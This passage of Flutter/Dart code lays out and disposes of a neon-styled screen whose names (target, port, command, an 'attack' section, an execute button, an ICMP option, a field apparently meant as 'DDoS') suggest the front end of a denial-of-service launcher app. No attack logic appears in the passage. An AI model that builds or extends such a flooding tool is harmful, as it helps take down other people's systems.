    final isIcmp = selectedDoosId.toLowerCase() == "icmp";

    return Scaffold(
      backgroundColor: _darkerBg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              child: Column(
                children: [
                  _buildNeonHeader(),
                  const SizedBox(height: 20),
                  Padding(
                    padding: const EdgeInsets.symmetric(horizontal: 20),
                    child: FadeTransition(
                      opacity: _fadeAnimation,
                      child: SlideTransition(
                        position: _slideAnimation,
                        child: Column(
                          children: [
                            _buildTargetSection(isIcmp),
                            const SizedBox(height: 20),
                            _buildAttackSection(),
                            const SizedBox(height: 20),
                            _buildExecuteButton(),
                            const SizedBox(height: 16),
                            _buildDisclaimer(),
                            const SizedBox(height: 32),
                            _buildFooter(),
                            const SizedBox(height: 24),
                          ],
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
          Positioned(
            top: 90,
            right: 16,
            child: _buildSpeedDial(),
          ),
        ],
      ),
    );
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _glowController.dispose();
    _slideController.dispose();
    _rotateController.dispose();
    targetController.dispose();
    portController.dispose();
    commandController.dispose();
    _videoController?.dispose();
    super.dispose();
  }
}